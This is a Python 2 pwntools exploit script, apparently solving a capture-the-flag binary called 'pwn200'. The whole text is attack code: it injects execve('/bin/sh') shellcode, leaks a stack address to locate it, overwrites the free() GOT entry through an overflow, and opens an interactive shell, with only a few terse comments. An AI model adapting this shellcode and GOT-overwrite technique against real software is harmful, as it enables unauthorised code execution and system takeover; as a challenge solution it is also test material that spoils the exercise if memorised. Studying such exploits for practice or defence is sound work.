#coding = utf8
from pwn import *
context(log_level="debug")

p = process('./pwn200')
elf = ELF('./pwn200')
free_got = elf.got["free"]

gdb.attach(p)
p.recvuntil('u?\n')

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.send(shellcode+"a"*(48-len(shellcode)))

ebp = u64(p.recvuntil(' me your id ~~?\n')[48:48+6].ljust(8,'\x00')) # leak stack address
print "ebp = "+hex(ebp)
offset = 0x00007fff401d62e0 - 0x00007fff401d6290
shellcode_addr = ebp - offset
print "shellcode_addr = " + hex(shellcode_addr)
p.sendline('0') #id

p.recvuntil('\n')

payload = p64(shellcode_addr)
p.send(payload + '\x00'*(0x38-len(payload)) + p64(free_got))  #the juck data must be '\x00' in the got!
p.recvuntil('choice :')
p.sendline('2')
p.interactive()
